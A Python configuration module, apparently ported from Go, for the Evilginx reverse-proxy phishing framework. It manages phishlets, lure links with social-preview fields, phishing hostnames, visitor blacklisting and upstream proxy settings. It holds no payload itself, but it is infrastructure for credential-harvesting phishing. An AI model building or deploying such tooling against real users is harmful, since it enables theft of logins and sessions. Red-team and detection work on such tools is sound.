#!/usr/bin/env python3
"""
Evilginx Python Conversion - Config Module
Converted from Go to Python
"""

import os
import yaml
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field, asdict


@dataclass
class Lure:
    hostname: str = ""
    path: str = ""
    redirect_url: str = ""
    phishlet: str = ""
    template: str = ""
    ua_filter: str = ""
    info: str = ""
    og_title: str = ""
    og_desc: str = ""
    og_image: str = ""
    og_url: str = ""


class Config:
    DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"  # Rick'roll
    
    def __init__(self, cfg_dir: str, path: str = ""):
        self.site_domains: Dict[str, str] = {}
        self.base_domain: str = ""
        self.server_ip: str = ""
        self.proxy_type: str = ""
        self.proxy_address: str = ""
        self.proxy_port: int = 0
        self.proxy_username: str = ""
        self.proxy_password: str = ""
        self.blacklist_mode: str = "off"
        self.proxy_enabled: bool = False
        self.sites_enabled: Dict[str, bool] = {}
        self.sites_hidden: Dict[str, bool] = {}
        self.phishlets: Dict[str, Any] = {}
        self.phishlet_names: List[str] = []
        self.active_hostnames: List[str] = []
        self.redirect_param: str = ""
        self.verification_param: str = ""
        self.verification_token: str = ""
        self.redirect_url: str = ""
        self.templates_dir: str = ""
        self.lures: List[Lure] = []
        self.cfg_data: Dict[str, Any] = {}
        self.cfg_path: str = ""
        
        self._load_or_create_config(cfg_dir, path)
    
    def _load_or_create_config(self, cfg_dir: str, path: str):
        """Load existing config or create new one"""
        if not path:
            path = os.path.join(cfg_dir, "config.yaml")
        
        os.makedirs(os.path.dirname(path), mode=0o700, exist_ok=True)
        self.cfg_path = path
        
        created_cfg = False
        if not os.path.exists(path):
            created_cfg = True
            self._save_config()
        
        self._load_config()
        
        # Set defaults if needed
        if not self.redirect_param:
            self.redirect_param = self._gen_random_string(2).lower()
        
        if not self.verification_param:
            while True:
                param = self._gen_random_string(2).lower()
                if param != self.redirect_param:
                    break
            self.verification_param = param
        
        if not self.verification_token:
            self.verification_token = self._gen_random_token()[:4]
        
        if not self.redirect_url and created_cfg:
            self.redirect_url = self.DEFAULT_REDIRECT_URL
        
        self._refresh_active_hostnames()
    
    def _load_config(self):
        """Load configuration from YAML file"""
        try:
            with open(self.cfg_path, 'r') as f:
                self.cfg_data = yaml.safe_load(f) or {}
            
            self.base_domain = self.cfg_data.get('server', '')
            self.server_ip = self.cfg_data.get('ip', '')
            self.site_domains = self.cfg_data.get('site_domains', {})
            self.redirect_param = self.cfg_data.get('redirect_key', '')
            self.verification_param = self.cfg_data.get('verification_key', '')
            self.verification_token = self.cfg_data.get('verification_token', '')
            self.redirect_url = self.cfg_data.get('redirect_url', '')
            self.proxy_type = self.cfg_data.get('proxy_type', '')
            self.proxy_address = self.cfg_data.get('proxy_address', '')
            self.proxy_port = self.cfg_data.get('proxy_port', 0)
            self.proxy_username = self.cfg_data.get('proxy_username', '')
            self.proxy_password = self.cfg_data.get('proxy_password', '')
            self.proxy_enabled = self.cfg_data.get('proxy_enabled', False)
            self.blacklist_mode = self.cfg_data.get('blacklist_mode', 'off')
            
            # Validate blacklist mode
            if self.blacklist_mode not in ['all', 'unauth', 'off']:
                self.blacklist_mode = 'off'
            
            sites_enabled = self.cfg_data.get('sites_enabled', [])
            for site in sites_enabled:
                self.sites_enabled[site] = True
            
            sites_hidden = self.cfg_data.get('sites_hidden', [])
            for site in sites_hidden:
                self.sites_hidden[site] = True
            
            lures_data = self.cfg_data.get('lures', [])
            self.lures = [Lure(**l) if isinstance(l, dict) else l for l in lures_data]
            
        except Exception as e:
            raise Exception(f"Failed to load config: {e}")
    
    def _save_config(self):
        """Save configuration to YAML file"""
        self.cfg_data['server'] = self.base_domain
        self.cfg_data['ip'] = self.server_ip
        self.cfg_data['site_domains'] = self.site_domains
        self.cfg_data['redirect_key'] = self.redirect_param
        self.cfg_data['verification_key'] = self.verification_param
        self.cfg_data['verification_token'] = self.verification_token
        self.cfg_data['redirect_url'] = self.redirect_url
        self.cfg_data['proxy_type'] = self.proxy_type
        self.cfg_data['proxy_address'] = self.proxy_address
        self.cfg_data['proxy_port'] = self.proxy_port
        self.cfg_data['proxy_username'] = self.proxy_username
        self.cfg_data['proxy_password'] = self.proxy_password
        self.cfg_data['proxy_enabled'] = self.proxy_enabled
        self.cfg_data['blacklist_mode'] = self.blacklist_mode
        self.cfg_data['sites_enabled'] = list(self.sites_enabled.keys())
        self.cfg_data['sites_hidden'] = list(self.sites_hidden.keys())
        self.cfg_data['lures'] = [asdict(l) for l in self.lures]
        
        try:
            with open(self.cfg_path, 'w') as f:
                yaml.dump(self.cfg_data, f, default_flow_style=False)
        except Exception as e:
            raise Exception(f"Failed to save config: {e}")
    
    @staticmethod
    def _gen_random_string(length: int) -> str:
        """Generate random string"""
        import random
        import string
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def _gen_random_token() -> str:
        """Generate random token"""
        import random
        import string
        return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    def set_site_hostname(self, site: str, domain: str) -> bool:
        """Set hostname for a phishlet"""
        if not self.base_domain:
            print("Error: you need to set server domain first")
            return False
        
        if domain != self.base_domain and not domain.endswith('.' + self.base_domain):
            print(f"Error: phishlet hostname must end with '{self.base_domain}'")
            return False
        
        self.site_domains[site] = domain
        self._save_config()
        print(f"Phishlet '{site}' hostname set to: {domain}")
        self._refresh_active_hostnames()
        return True
    
    def set_base_domain(self, domain: str):
        """Set base domain"""
        self.base_domain = domain
        self._save_config()
        print(f"Server domain set to: {domain}")
    
    def set_server_ip(self, ip_addr: str):
        """Set server IP"""
        self.server_ip = ip_addr
        self._save_config()
        print(f"Server IP set to: {ip_addr}")
    
    def enable_proxy(self, enabled: bool):
        """Enable/disable proxy"""
        self.proxy_enabled = enabled
        self._save_config()
        print(f"{'Enabled' if enabled else 'Disabled'} proxy")
    
    def set_proxy_type(self, ptype: str):
        """Set proxy type"""
        valid_types = ['http', 'https', 'socks5', 'socks5h']
        if ptype not in valid_types:
            print("Error: invalid proxy type")
            return
        self.proxy_type = ptype
        self._save_config()
        print(f"Proxy type set to: {ptype}")
    
    def set_proxy_address(self, address: str):
        """Set proxy address"""
        self.proxy_address = address
        self._save_config()
        print(f"Proxy address set to: {address}")
    
    def set_proxy_port(self, port: int):
        """Set proxy port"""
        self.proxy_port = port
        self._save_config()
        print(f"Proxy port set to: {port}")
    
    def set_proxy_username(self, username: str):
        """Set proxy username"""
        self.proxy_username = username
        self._save_config()
        print(f"Proxy username set to: {username}")
    
    def set_proxy_password(self, password: str):
        """Set proxy password"""
        self.proxy_password = password
        self._save_config()
        print(f"Proxy password set to: {password}")
    
    def set_site_enabled(self, site: str) -> bool:
        """Enable a phishlet"""
        if site not in self.phishlets:
            print(f"Error: phishlet '{site}' not found")
            return False
        
        if not self.is_site_enabled(site):
            self.sites_enabled[site] = True
        
        self._save_config()
        self._refresh_active_hostnames()
        print(f"Enabled phishlet '{site}'")
        return True
    
    def set_site_disabled(self, site: str) -> bool:
        """Disable a phishlet"""
        if site not in self.phishlets:
            print(f"Error: phishlet '{site}' not found")
            return False
        
        if self.is_site_enabled(site):
            del self.sites_enabled[site]
        
        self._save_config()
        self._refresh_active_hostnames()
        print(f"Disabled phishlet '{site}'")
        return True
    
    def set_site_hidden(self, site: str, hide: bool) -> bool:
        """Hide/unhide a phishlet"""
        if site not in self.phishlets:
            print(f"Error: phishlet '{site}' not found")
            return False
        
        if hide:
            self.sites_hidden[site] = True
        else:
            if site in self.sites_hidden:
                del self.sites_hidden[site]
        
        self._save_config()
        self._refresh_active_hostnames()
        status = "hidden" if hide else "visible"
        print(f"Phishlet '{site}' is now {status}")
        return True
    
    def set_templates_dir(self, path: str):
        """Set templates directory"""
        self.templates_dir = path
    
    def reset_all_sites(self):
        """Reset all site configurations"""
        for site in list(self.sites_enabled.keys()):
            self.set_site_disabled(site)
        
        for site in self.phishlets:
            self.site_domains[site] = ""
        
        self._save_config()
    
    def is_site_enabled(self, site: str) -> bool:
        """Check if site is enabled"""
        return self.sites_enabled.get(site, False)
    
    def is_site_hidden(self, site: str) -> bool:
        """Check if site is hidden"""
        return self.sites_hidden.get(site, False)
    
    def get_enabled_sites(self) -> List[str]:
        """Get list of enabled sites"""
        return list(self.sites_enabled.keys())
    
    def set_redirect_param(self, param: str):
        """Set redirect parameter"""
        self.redirect_param = param
        self._save_config()
        print(f"Redirect parameter set to: {param}")
    
    def set_blacklist_mode(self, mode: str):
        """Set blacklist mode"""
        if mode in ['all', 'unauth', 'off']:
            self.blacklist_mode = mode
            self._save_config()
        print(f"Blacklist mode set to: {mode}")
    
    def set_verification_param(self, param: str):
        """Set verification parameter"""
        self.verification_param = param
        self._save_config()
        print(f"Verification parameter set to: {param}")
    
    def set_verification_token(self, token: str):
        """Set verification token"""
        self.verification_token = token
        self._save_config()
        print(f"Verification token set to: {token}")
    
    def set_redirect_url(self, url: str):
        """Set redirect URL"""
        self.redirect_url = url
        self._save_config()
        print(f"Unauthorized request redirection URL set to: {url}")
    
    def _refresh_active_hostnames(self):
        """Refresh list of active hostnames"""
        self.active_hostnames = []
        sites = self.get_enabled_sites()
        
        for site in sites:
            if site in self.phishlets:
                pl = self.phishlets[site]
                if hasattr(pl, 'get_phish_hosts'):
                    for host in pl.get_phish_hosts():
                        self.active_hostnames.append(host)
        
        for lure in self.lures:
            if lure.phishlet in sites and lure.hostname:
                self.active_hostnames.append(lure.hostname)
    
    def is_active_hostname(self, host: str) -> bool:
        """Check if hostname is active"""
        if host.endswith('.'):
            host = host[:-1]
        return host in self.active_hostnames
    
    def add_phishlet(self, site: str, pl):
        """Add a phishlet"""
        self.phishlet_names.append(site)
        self.phishlets[site] = pl
    
    def add_lure(self, site: str, lure: Lure):
        """Add a lure"""
        self.lures.append(lure)
        self._save_config()
    
    def set_lure(self, index: int, lure: Lure) -> bool:
        """Update a lure"""
        if 0 <= index < len(self.lures):
            self.lures[index] = lure
            self._save_config()
            return True
        return False
    
    def delete_lure(self, index: int) -> bool:
        """Delete a lure"""
        if 0 <= index < len(self.lures):
            self.lures.pop(index)
            self._save_config()
            return True
        return False
    
    def get_lure(self, index: int) -> Optional[Lure]:
        """Get a lure by index"""
        if 0 <= index < len(self.lures):
            return self.lures[index]
        return None
    
    def get_phishlet(self, site: str):
        """Get a phishlet by name"""
        if site in self.phishlets:
            return self.phishlets[site]
        return None
    
    def get_phishlet_names(self) -> List[str]:
        """Get list of all phishlet names"""
        return self.phishlet_names
    
    def get_site_domain(self, site: str) -> tuple:
        """Get domain for a site"""
        domain = self.site_domains.get(site, '')
        return domain, site in self.site_domains
    
    def get_all_domains(self) -> List[str]:
        """Get all configured domains"""
        return list(self.site_domains.values())
    
    def get_base_domain(self) -> str:
        """Get base domain"""
        return self.base_domain
    
    def get_server_ip(self) -> str:
        """Get server IP"""
        return self.server_ip
    
    def get_templates_dir(self) -> str:
        """Get templates directory"""
        return self.templates_dir
    
    def get_blacklist_mode(self) -> str:
        """Get blacklist mode"""
        return self.blacklist_mode
    
    def get_config_summary(self) -> Dict[str, Any]:
        """Get summary of configuration"""
        return {
            'base_domain': self.base_domain,
            'server_ip': self.server_ip,
            'proxy_enabled': self.proxy_enabled,
            'proxy_type': self.proxy_type,
            'blacklist_mode': self.blacklist_mode,
            'sites_enabled': self.get_enabled_sites(),
            'sites_hidden': list(self.sites_hidden.keys()),
            'phishlets_loaded': len(self.phishlets),
            'lures_count': len(self.lures),
            'active_hostnames': self.active_hostnames
        }
